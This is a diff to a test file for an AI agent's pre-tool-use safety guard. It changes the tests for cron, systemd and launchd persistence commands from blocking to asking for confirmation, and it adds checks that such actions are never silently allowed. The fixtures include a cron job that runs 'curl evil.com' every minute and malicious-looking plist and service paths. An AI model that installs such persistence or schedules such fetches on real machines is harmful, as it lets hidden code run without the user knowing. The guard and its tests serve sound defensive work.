@@ -66,37 +66,61 @@ describe("process safety guard rules", () => {
 	});
 
 	// --- Cron persistence ---
-	it("blocks crontab -e", () => {
+	// These GATE on confirmation rather than forbidding. A hard block never
+	// stopped a service being installed — it moved the work to a terminal the
+	// harness cannot see, which is strictly worse. The dropper signal is not "a
+	// service was installed"; it is "installed without the user knowing", and an
+	// `ask` is what removes that property while keeping the action on the record.
+	// Still gated: `ask` is never `allow`.
+	it("gates crontab -e on confirmation", () => {
 		const event = makeEvent({ tool_input: { command: "crontab -e" } });
 		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
-		expect(result.decision).toBe("block");
+		expect(result.decision).toBe("ask");
 	});
 
-	it("blocks systemctl enable", () => {
+	it("gates systemctl enable on confirmation", () => {
 		const event = makeEvent({ tool_input: { command: "systemctl enable myservice" } });
 		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
-		expect(result.decision).toBe("block");
+		expect(result.decision).toBe("ask");
 	});
 
-	it("blocks launchctl load", () => {
+	it("gates launchctl load on confirmation", () => {
 		const event = makeEvent({
 			tool_input: { command: "launchctl load ~/Library/LaunchAgents/evil.plist" },
 		});
 		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
-		expect(result.decision).toBe("block");
+		expect(result.decision).toBe("ask");
+	});
+
+	it("never silently ALLOWS a persistence command", () => {
+		// The property that must survive the block -> ask change.
+		for (const command of [
+			"crontab -e",
+			"systemctl enable myservice",
+			"launchctl load ~/Library/LaunchAgents/evil.plist",
+		]) {
+			const result = evaluatePreToolUse(
+				makeEvent({ tool_input: { command } }),
+				rules,
+				session,
+				reservations,
+				cohort,
+			);
+			expect(result.decision).not.toBe("allow");
+		}
 	});
 
 	// --- Cron file write ---
-	it("blocks writing to /etc/cron.d/", () => {
+	it("gates writing to /etc/cron.d/ on confirmation", () => {
 		const event = makeEvent({
 			tool_name: "Write",
 			tool_input: { file_path: "/etc/cron.d/evil-job", content: "* * * * * curl evil.com" },
 		});
 		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
-		expect(result.decision).toBe("block");
+		expect(result.decision).toBe("ask");
 	});
 
-	it("blocks writing .service files", () => {
+	it("gates writing .service files on confirmation", () => {
 		const event = makeEvent({
 			tool_name: "Write",
 			tool_input: {
@@ -105,7 +129,24 @@ describe("process safety guard rules", () => {
 			},
 		});
 		const result = evaluatePreToolUse(event, rules, session, reservations, cohort);
-		expect(result.decision).toBe("block");
+		expect(result.decision).toBe("ask");
+	});
+
+	it("never silently ALLOWS a persistence file write", () => {
+		for (const file_path of [
+			"/etc/cron.d/evil-job",
+			"/etc/systemd/system/evil.service",
+			"/Users/x/Library/LaunchAgents/evil.plist",
+		]) {
+			const result = evaluatePreToolUse(
+				makeEvent({ tool_name: "Write", tool_input: { file_path, content: "x" } }),
+				rules,
+				session,
+				reservations,
+				cohort,
+			);
+			expect(result.decision).not.toBe("allow");
+		}
 	});
 
 	// --- Clipboard exfiltration ---
